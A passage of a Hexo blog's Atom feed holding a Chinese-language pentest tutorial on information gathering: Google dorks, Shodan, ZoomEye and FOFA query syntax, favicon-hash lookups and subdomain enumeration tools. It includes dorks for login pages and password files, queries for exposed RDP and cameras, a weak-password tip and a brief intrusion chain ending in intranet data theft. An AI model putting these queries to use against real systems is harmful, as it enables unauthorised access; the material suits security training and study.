<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>离沫凌天๓</title>
  
  <subtitle>花开花落 一路上起起跌跌</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://winthorlimo.github.io/"/>
  <updated>2020-08-02T14:20:14.283Z</updated>
  <id>https://winthorlimo.github.io/</id>
  
  <author>
    <name>离沫凌天๓</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>信息收集</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined01/312e3d12.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined01/312e3d12.html</id>
    <published>2020-08-01T10:47:24.355Z</published>
    <updated>2020-08-02T14:20:14.283Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集技术"><a href="#信息收集技术" class="headerlink" title="信息收集技术"></a>信息收集技术</h1><p>在渗透测试过程中，第一步就是进行信息收集，信息收集的过程，很多人将其写成了工具、脚本，于是我们就有了很多指纹识别工具、敏感文件、目录扫描工具，敏感信息探测工具，信息收集工具等等。很多前辈也都曾经说过：”渗透测试的本质就是信息收集”</p><h2 id="信息收集介绍"><a href="#信息收集介绍" class="headerlink" title="信息收集介绍"></a>信息收集介绍</h2><h3 id="常规收集"><a href="#常规收集" class="headerlink" title="常规收集"></a>常规收集</h3><ul><li>备份文件泄露</li><li>接口泄露(小米主题商店接口信息泄露开发者敏感信息（身份证、手机等）</li></ul><h3 id="从信息泄露到未授权访问"><a href="#从信息泄露到未授权访问" class="headerlink" title="从信息泄露到未授权访问"></a>从信息泄露到未授权访问</h3><ul><li>端口扫描与目录扫描<br><code>端口多扫几个</code></li></ul><h3 id="内网收集"><a href="#内网收集" class="headerlink" title="内网收集"></a>内网收集</h3><ul><li>内网服务器邮箱记录</li><li>浏览器保存密码记录</li><li>ESXI 认证<br><code>Vcenter 可以尝试勾选启用windows登录认证</code></li></ul><p>信息收集的方式可以分为两种：主动和被动。</p><p><strong>主动的信息收集方式：</strong> 通过直接访问、扫描网站，这种将流量流经网站的行为。</p><p><strong>被动的信息收集方式：</strong> 利用第三方服务和互联网信息进行收集。</p><h1 id="被动信息收集（OSINT）"><a href="#被动信息收集（OSINT）" class="headerlink" title="被动信息收集（OSINT）"></a>被动信息收集（OSINT）</h1><h2 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google Hack"></a>Google Hack</h2><p>在渗透测试过程中第一步就是信息收集，由于传统的信息收集工具包括指纹识别、目录扫描器等会留下痕迹，某些情况下还会被拦截，因此，能否在不惊动目标服务器的情况下，对目标网站进行前期最重要的信息收集，并且尽可能的获得更多的信息呢？</p><p><img src="http://qiniuyun.lintstar.top/30th-anniversary-of-the-world-wide-web-google-1552390014.gif" alt="30th-anniversary-of-the-world-wide-web-google-1552390014"></p><h3 id="默认搜索"><a href="#默认搜索" class="headerlink" title="默认搜索"></a>默认搜索</h3><p>搜索引擎基本语法，直接在搜索框中输入搜索词时，谷歌默认进行模糊搜索，并能对长短语或语句进行自动拆分成小的词进行搜索。</p><p><img src="http://qiniuyun.lintstar.top/image-20200724172909442.png" alt="image-20200724172909442"></p><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><p>谷歌的通配符是星号 *，用通配符代替关键词或短语中无法确定的字词。</p><p><img src="http://qiniuyun.lintstar.top/image-20200724174304528.png" alt="image-20200724174304528"></p><h3 id="逻辑非"><a href="#逻辑非" class="headerlink" title="逻辑非"></a>逻辑非</h3><p>排除某个搜索结果：渗透测试 -习近平 百度无广告</p><p><img src="http://qiniuyun.lintstar.top/image-20200724174331551.png" alt="image-20200724174331551"></p><h3 id="常用关键词"><a href="#常用关键词" class="headerlink" title="常用关键词"></a>常用关键词</h3><table><thead><tr><th>关键词</th><th>说明</th></tr></thead><tbody><tr><td>site</td><td>指定域名</td></tr><tr><td>intext</td><td>正文中存在关键词的网页</td></tr><tr><td>intitle</td><td>标题中存在关键词的网页</td></tr><tr><td>inurl</td><td>URL中存在关键词的网页</td></tr><tr><td>filetype</td><td>搜索指定文件类型</td></tr></tbody></table><h3 id="常见后台查找"><a href="#常见后台查找" class="headerlink" title="常见后台查找"></a>常见后台查找</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">intitle:后台登录</span><br><span class="line"></span><br><span class="line">inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</span><br><span class="line"></span><br><span class="line">intext:管理|后台|登陆|用户名|密码|系统|帐号</span><br></pre></td></tr></table></figure><h3 id="实际演示"><a href="#实际演示" class="headerlink" title="实际演示"></a>实际演示</h3><h4 id="搜索南京政府的子域名信息："><a href="#搜索南京政府的子域名信息：" class="headerlink" title="搜索南京政府的子域名信息："></a>搜索南京政府的子域名信息：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:nanjing.gov.cn</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200724174446728.png" alt="image-20200724174446728"></p><h4 id="搜索互联网上的登录入口："><a href="#搜索互联网上的登录入口：" class="headerlink" title="搜索互联网上的登录入口："></a>搜索互联网上的登录入口：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intitle:登录</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200724174502081.png" alt="image-20200724174502081"></p><h4 id="搜索百度的相关登录入口："><a href="#搜索百度的相关登录入口：" class="headerlink" title="搜索百度的相关登录入口："></a>搜索百度的相关登录入口：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intitle:登录 site:baidu.com -zhidao.baidu.com -baike.baidu.com -jingyan.baidu.com</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200724174547698.png" alt="image-20200724174547698"></p><h4 id="查找互联网敏感文件："><a href="#查找互联网敏感文件：" class="headerlink" title="查找互联网敏感文件："></a>查找互联网敏感文件：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filetype:mdb|doc|xlsx|pdf</span><br><span class="line">密码 filetype:xls</span><br></pre></td></tr></table></figure><h4 id="查找被黑政府站点："><a href="#查找被黑政府站点：" class="headerlink" title="查找被黑政府站点："></a>查找被黑政府站点：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">北京赛车 inurl:gov.cn</span><br><span class="line">intitle:北京赛车 inurl:gov.cn</span><br></pre></td></tr></table></figure><h2 id="物联网搜索引擎"><a href="#物联网搜索引擎" class="headerlink" title="物联网搜索引擎"></a>物联网搜索引擎</h2><h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h3><p><img src="http://qiniuyun.lintstar.top/20200802002840.png" alt="20200802002840"><br><strong><a href="https://www.shodan.io" target="_blank" rel="noopener">https://www.shodan.io</a></strong></p><p>物联网搜索引擎，是互联网上最可怕的搜索引擎，搜索所有和互联网关联的服务器、摄像头、打印机、路由器等等。</p><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><table><thead><tr><th>关键词</th><th>说明</th></tr></thead><tbody><tr><td>net</td><td>搜索指定ip地址或者子网，c段</td></tr><tr><td>hostname</td><td>搜索指定的域名或者服务器</td></tr><tr><td>port</td><td>搜索开放指定端口的设备</td></tr><tr><td>org</td><td>搜索属于指定组织或者公司的设备</td></tr><tr><td>product</td><td>搜索运行指定产品或者软件操作系统的设备</td></tr><tr><td>version</td><td>指定软件的版本</td></tr><tr><td>isp</td><td>搜索指定isp供应商的设备</td></tr><tr><td>country</td><td>搜索指定国家的设备</td></tr><tr><td>city</td><td>搜索指定城市的设备</td></tr></tbody></table><p>语句之间可以相互组合使用，可以运用自己的思维，相互组合成自己需要的搜索语句</p><h3 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h3><h4 id="查找位于国内的-Nginx-服务器："><a href="#查找位于国内的-Nginx-服务器：" class="headerlink" title="查找位于国内的 Nginx 服务器："></a>查找位于国内的 Nginx 服务器：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx country:cn</span><br></pre></td></tr></table></figure><h4 id="搜索位南京开启-3389-端口的服务器"><a href="#搜索位南京开启-3389-端口的服务器" class="headerlink" title="搜索位南京开启 3389 端口的服务器"></a>搜索位南京开启 3389 端口的服务器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">port:3389 city:nanjing</span><br><span class="line">port:3389 os:&quot;windows 10&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索海康威视摄像头"><a href="#搜索海康威视摄像头" class="headerlink" title="搜索海康威视摄像头"></a>搜索海康威视摄像头</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hikvision-Webs country:cn city:nanjing</span><br></pre></td></tr></table></figure><h4 id="查看Cisco思科设备全球分布"><a href="#查看Cisco思科设备全球分布" class="headerlink" title="查看Cisco思科设备全球分布"></a>查看Cisco思科设备全球分布</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">isp:cisco</span><br><span class="line">isp:cisco country:cn</span><br></pre></td></tr></table></figure><h4 id="查看华为设备全球分布"><a href="#查看华为设备全球分布" class="headerlink" title="查看华为设备全球分布"></a>查看华为设备全球分布</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">isp:huawei</span><br></pre></td></tr></table></figure><p><strong><code>windows口令必须大小写后，弱口令TOP：P@ssw0rd</code></strong></p><h3 id="实用技巧"><a href="#实用技巧" class="headerlink" title="实用技巧"></a>实用技巧</h3><p>Shodan 实用技巧，查找互相关联的网站：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import mmh3</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">response = requests.get(&apos;https://www.baidu.com/favicon.ico&apos;)</span><br><span class="line">favicon = response.content.encode(&apos;base64&apos;)</span><br><span class="line">hash = mmh3.hash(favicon)</span><br><span class="line">print(hash)</span><br></pre></td></tr></table></figure></p><p>计算出的 hash 用如下语法来反查：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.favicon.hash：hash</span><br></pre></td></tr></table></figure></p><p><strong>查找出类似模板的IP地址：<a href="http://111.231.41.219/" target="_blank" rel="noopener">http://111.231.41.219/</a></strong></p><p><img src="http://qiniuyun.lintstar.top/20200802003028.png" alt="20200802003028"></p><p>查看原始数据 Ctrl+F 搜索 favicon</p><p><img src="http://qiniuyun.lintstar.top/20200802003451.png" alt="20200802003451"></p><p>根据hash值反差：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.favicon.hash:-865290023</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200802003849.png" alt="20200802003849"><br><strong><code>找同模板网站：看是不是一个logo/favicon 用小米logo的hash值反查</code></strong></p><p><strong>研究院真实案例分享</strong></p><p>目标黄色网站 - 拿不下 - 找到同模板的网站 - 爆破 - 进入系统 - 通用漏洞 getshell - 拿到源码 - 代码审计 - 发现漏洞 - 拿下目标网站 - getshell - 突破限制进内网 - 内网漫游拿下数据</p><h3 id="Zoomeye"><a href="#Zoomeye" class="headerlink" title="Zoomeye"></a>Zoomeye</h3><p><img src="http://qiniuyun.lintstar.top/1558883226923-5598295.png" alt="1558883226923-5598295"><br><strong><a href="https://www.zoomeye.org" target="_blank" rel="noopener">https://www.zoomeye.org</a></strong></p><p>ZoomEye 中文名为“钟馗之眼”，它定位于网络空间搜索引擎，能对暴露在公网的主机设备及网站组件进行全方位搜索（只要有IP地址即可搜索到），发现其中的漏洞，揪 出网络中“藏着掖着的问题”。ZoomEye和Shodan的区别是ZoomEye目前侧重于Web层面的资产发现而Shodan则侧重于主机层面。</p><h3 id="主机搜索"><a href="#主机搜索" class="headerlink" title="主机搜索"></a>主机搜索</h3><h4 id="组件名称"><a href="#组件名称" class="headerlink" title="组件名称"></a>组件名称</h4><p>app: 组件名。 ver: 组件版本。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app:”Apache httpd” ver:”2.2.16″</span><br></pre></td></tr></table></figure></p><h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><p>port: 开放端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">port:3389</span><br></pre></td></tr></table></figure><h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><p>os: 操作系统。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os:linux</span><br></pre></td></tr></table></figure></p><h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><p>service: 结果分析中的“服务名”字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 公网路由器： </span><br><span class="line">service:routersetup</span><br><span class="line"># 公网摄像头： </span><br><span class="line">service:webcam</span><br></pre></td></tr></table></figure></p><h4 id="主机名"><a href="#主机名" class="headerlink" title="主机名"></a>主机名</h4><p>hostname: 分析结果中的“主机名”字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname:google.com</span><br></pre></td></tr></table></figure></p><h4 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h4><p>country: 国家或者地区代码。 city: 城市名称。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 搜索美国的 Apache 服务器</span><br><span class="line">app:Apache country:US</span><br><span class="line"></span><br><span class="line"># 搜索英国的 Sendmail 服务器</span><br><span class="line">app:Sendmail country:UK</span><br></pre></td></tr></table></figure></p><h4 id="IP-地址"><a href="#IP-地址" class="headerlink" title="IP 地址"></a>IP 地址</h4><p>ip: 搜索一个指定的 IP 地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Google 的公共 DNS 服务器</span><br><span class="line">ip:8.8.8.8</span><br></pre></td></tr></table></figure></p><h4 id="CIDR"><a href="#CIDR" class="headerlink" title="CIDR"></a>CIDR</h4><p>IP 的 CIDR 网段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cidr:8.8.8.8/24</span><br></pre></td></tr></table></figure></p><h3 id="Web应用搜索"><a href="#Web应用搜索" class="headerlink" title="Web应用搜索"></a>Web应用搜索</h3><h4 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h4><p>site:网站域名。 例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site: baidu.com</span><br></pre></td></tr></table></figure></p><h4 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h4><p>title: 页面标题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title:Nginx</span><br></pre></td></tr></table></figure></p><h4 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h4><p>keywords: <meta name="Keywords">定义的页面关键词。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keywords:Nginx</span><br></pre></td></tr></table></figure></p><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>desc: <meta name="description">定义的页面说明。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc:Nginx</span><br></pre></td></tr></table></figure></p><h4 id="HTTP-头"><a href="#HTTP-头" class="headerlink" title="HTTP 头"></a>HTTP 头</h4><p>headers: HTTP 请求中的 Headers。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">headers:Server</span><br></pre></td></tr></table></figure></p><h3 id="FQFA"><a href="#FQFA" class="headerlink" title="FQFA"></a>FQFA</h3><p><img src="http://qiniuyun.lintstar.top/20200802004152.png" alt="20200802004152"><br><strong><a href="https://fofa.so" target="_blank" rel="noopener">https://fofa.so</a></strong></p><p>FOFA是白帽汇推出的一款网络空间资产搜索引擎。 它能够帮助企业客户迅速进行网络资产匹配、加快后续工作进程。 例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。</p><h3 id="基本语法-1"><a href="#基本语法-1" class="headerlink" title="基本语法"></a>基本语法</h3><p>直接输入查询语句，将从标题，html内容，http头信息，url字段中搜索</p><h4 id="title-”abc”-从标题中搜索abc"><a href="#title-”abc”-从标题中搜索abc" class="headerlink" title="title=”abc” 从标题中搜索abc"></a>title=”abc” 从标题中搜索abc</h4><p>标题中有北京的网站<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=&quot;北京&quot;</span><br></pre></td></tr></table></figure></p><h4 id="header-”abc”-从http头中搜索abc"><a href="#header-”abc”-从http头中搜索abc" class="headerlink" title="header=”abc” 从http头中搜索abc"></a>header=”abc” 从http头中搜索abc</h4><p>jboss服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header=&quot;jboss&quot;</span><br></pre></td></tr></table></figure></p><h4 id="body-”abc”-从html正文中搜索abc"><a href="#body-”abc”-从html正文中搜索abc" class="headerlink" title="body=”abc” 从html正文中搜索abc"></a>body=”abc” 从html正文中搜索abc</h4><p>正文包含Hacked by<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body=&quot;Hacked by&quot;</span><br></pre></td></tr></table></figure></p><h4 id="domain-”qq-com”-搜索根域名带有qq-com的网站"><a href="#domain-”qq-com”-搜索根域名带有qq-com的网站" class="headerlink" title="domain=”qq.com” 搜索根域名带有qq.com的网站"></a>domain=”qq.com” 搜索根域名带有qq.com的网站</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">domain=&quot;qq.com&quot;</span><br></pre></td></tr></table></figure><h4 id="host-”-gov-cn”-从url中搜索-gov-cn"><a href="#host-”-gov-cn”-从url中搜索-gov-cn" class="headerlink" title="host=”.gov.cn” 从url中搜索.gov.cn"></a>host=”.gov.cn” 从url中搜索.gov.cn</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=&quot;.gov.cn&quot;</span><br></pre></td></tr></table></figure><h4 id="教育网站"><a href="#教育网站" class="headerlink" title="教育网站"></a>教育网站</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=&quot;.edu.cn&quot;</span><br></pre></td></tr></table></figure><h4 id="port-”443”-查找对应443端口的资产"><a href="#port-”443”-查找对应443端口的资产" class="headerlink" title="port=”443” 查找对应443端口的资产"></a>port=”443” 查找对应443端口的资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">port=&quot;443&quot;</span><br></pre></td></tr></table></figure><h4 id="ip-”1-1-1-1”-搜索ip信息"><a href="#ip-”1-1-1-1”-搜索ip信息" class="headerlink" title="ip=”1.1.1.1” 搜索ip信息"></a>ip=”1.1.1.1” 搜索ip信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">39.98.209.64</span><br></pre></td></tr></table></figure><h4 id="protocol-”https”-搜索制定协议类型-在开启端口扫描的情况下有效"><a href="#protocol-”https”-搜索制定协议类型-在开启端口扫描的情况下有效" class="headerlink" title="protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)"></a>protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol=&quot;https&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索指定城市的资产"><a href="#搜索指定城市的资产" class="headerlink" title="搜索指定城市的资产"></a>搜索指定城市的资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">city=&quot;Beijing&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索指定行政区的资产"><a href="#搜索指定行政区的资产" class="headerlink" title="搜索指定行政区的资产"></a>搜索指定行政区的资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">region=&quot;Zhejiang&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索指定国家-编码-的资产"><a href="#搜索指定国家-编码-的资产" class="headerlink" title="搜索指定国家(编码)的资产"></a>搜索指定国家(编码)的资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">country=&quot;CN&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索证书-https或者imaps等-中带有google的资产"><a href="#搜索证书-https或者imaps等-中带有google的资产" class="headerlink" title="搜索证书(https或者imaps等)中带有google的资产"></a>搜索证书(https或者imaps等)中带有google的资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cert=&quot;google&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索FTP协议中带有users文本的资产"><a href="#搜索FTP协议中带有users文本的资产" class="headerlink" title="搜索FTP协议中带有users文本的资产"></a>搜索FTP协议中带有users文本的资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">banner=users &amp;&amp; protocol=ftp</span><br></pre></td></tr></table></figure><h4 id="搜索所有协议资产，支持subdomain和service两种"><a href="#搜索所有协议资产，支持subdomain和service两种" class="headerlink" title="搜索所有协议资产，支持subdomain和service两种"></a>搜索所有协议资产，支持subdomain和service两种</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type=service</span><br></pre></td></tr></table></figure><h4 id="搜索Windows资产"><a href="#搜索Windows资产" class="headerlink" title="搜索Windows资产"></a>搜索Windows资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os=windows</span><br></pre></td></tr></table></figure><h4 id="搜索IIS-7-5服务器"><a href="#搜索IIS-7-5服务器" class="headerlink" title="搜索IIS 7.5服务器"></a>搜索IIS 7.5服务器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server==&quot;Microsoft-IIS/7.5&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索海康威视设备"><a href="#搜索海康威视设备" class="headerlink" title="搜索海康威视设备"></a>搜索海康威视设备</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app=&quot;海康威视-视频监控&quot;</span><br></pre></td></tr></table></figure><h4 id="时间范围段搜索"><a href="#时间范围段搜索" class="headerlink" title="时间范围段搜索"></a>时间范围段搜索</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">after=&quot;2017&quot; &amp;&amp; before=&quot;2017-10-01&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索指定org-组织-的资产"><a href="#搜索指定org-组织-的资产" class="headerlink" title="搜索指定org(组织)的资产"></a>搜索指定org(组织)的资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org=&quot;Amazon.com, Inc.&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索指定udp协议的资产"><a href="#搜索指定udp协议的资产" class="headerlink" title="搜索指定udp协议的资产"></a>搜索指定udp协议的资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_protocol=&quot;udp&quot;</span><br></pre></td></tr></table></figure><h3 id="高级搜索"><a href="#高级搜索" class="headerlink" title="高级搜索"></a>高级搜索</h3><p>可以使用括号 和 &amp;&amp; || !=等符号，如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">title=&quot;powered by&quot; &amp;&amp; title!=discuz</span><br><span class="line"></span><br><span class="line">title!=&quot;powered by&quot; &amp;&amp; body=discuz</span><br><span class="line"></span><br><span class="line">( body=&quot;content=\&quot;WordPress&quot; || (header=&quot;X-Pingback&quot; &amp;&amp; header=&quot;/xmlrpc.php&quot; &amp;&amp; body=&quot;/wp-includes/&quot;) ) &amp;&amp; host=&quot;gov.cn&quot;</span><br></pre></td></tr></table></figure></p><h3 id="规则探索与发现"><a href="#规则探索与发现" class="headerlink" title="规则探索与发现"></a>规则探索与发现</h3><p><a href="https://fofa.so/subject" target="_blank" rel="noopener">https://fofa.so/subject</a></p><p><a href="https://fofa.so/library" target="_blank" rel="noopener">https://fofa.so/library</a></p><p><img src="http://qiniuyun.lintstar.top/1558908508820.png" alt="1558908508820"></p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p>域名爆破是指使用爆破字段拼接主域名尝试访问，暴力破解出主域名下是否还有其他子域名。</p><p>例如通过某公司官网的主域名，可以暴力破解出该公司内部系统（如OA、CRM等等）的访问地址。</p><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><h3 id="在线爆破工具"><a href="#在线爆破工具" class="headerlink" title="在线爆破工具"></a>在线爆破工具</h3><p>phpinfo.me/domain</p><p><img src="http://qiniuyun.lintstar.top/20200802001346.png" alt="20200802001346"></p><h3 id="本地工具爆破"><a href="#本地工具爆破" class="headerlink" title="本地工具爆破"></a>本地工具爆破</h3><p><strong>subDomainsBrute</strong><br><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p><p>每秒可扫描3000个域名</p><p><strong>Layer 子域名挖掘机</strong></p><p>法师经典作品，操作简单容易上手</p><p><a href="https://github.com/euphrat1ca/LayerDomainFinder" target="_blank" rel="noopener">https://github.com/euphrat1ca/LayerDomainFinder</a></p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><h4 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h4><p><code>site: domain</code></p><p><img src="http://qiniuyun.lintstar.top/20200802001531.png" alt="20200802001531"></p><h4 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h4><p>👊 OneForAll是一款功能强大的子域收集工具</p><p><img src="http://qiniuyun.lintstar.top/20200802001743.png" alt="20200802001743"></p><h4 id="自己动手丰衣足食"><a href="#自己动手丰衣足食" class="headerlink" title="自己动手丰衣足食"></a>自己动手丰衣足食</h4><p>Django 编写 Web 漏洞扫描器挖坑记录： <a href="https://www.sqlsec.com/2020/05/webscan.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/05/webscan.html</a></p><p>域名探测功能发现比较流行的子域名探测功能 one for all 用的也是很多 API 接口，于是打算使用第三方服务来获取子域名，这样获取的速度会很快。</p><p>因为这些子域名是存入数据库的，所以也就顺便增加了域名监控功能，每次扫描可以统计出新增的域名数量。域名探测所使用的 6 个接口分别如下，大家也可以直接拿去使用，做好对应的数据提取就可以了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 爱站</span><br><span class="line">https://baidurank.aizhan.com/baidu/&#123;domain&#125;/</span><br><span class="line"></span><br><span class="line"># 百度云观测</span><br><span class="line">http://ce.baidu.com/index/getRelatedSites?site_address=&#123;domain&#125;</span><br><span class="line"></span><br><span class="line"># hackertarget</span><br><span 